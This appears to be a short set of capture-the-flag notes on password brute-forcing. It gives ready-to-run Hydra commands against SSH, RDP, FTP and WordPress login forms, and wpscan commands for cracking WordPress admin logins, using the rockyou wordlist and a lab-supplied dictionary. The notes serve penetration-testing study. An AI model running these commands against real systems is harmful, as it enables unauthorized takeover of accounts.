# Attacks

## Hydra

### Basics

A standard attack looks like: 

`hydra -l ${user} -P /usr/share/wordlists/rockyou.txt ${RHOST} ${mode}`
modes can be eg. `ssh`, `rdp`,`vnc`, `ftp` or `http[s]-post-form`.

An example of an attack made towards a wordpress site eg. looked like this:
```
hydra $RHOST -l Elliot -P fsocity.dic http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username"
```
(For this particular box, we were given a file `fsocity.dic` to use for fuzzing)

## WordPress

If you find a wordpress site, it's worth checking if you can pwn the admin login with:

```
wpscan -U admin --url $RHOST/${PATH} -P /usr/share/wordlists/rockyou.txt
```

An example of an equivalent `wpscan` command for the above hydra command, is:

```
wpscan -U Elliot --url $RHOST/wp-login -P fsocity.dic 
```
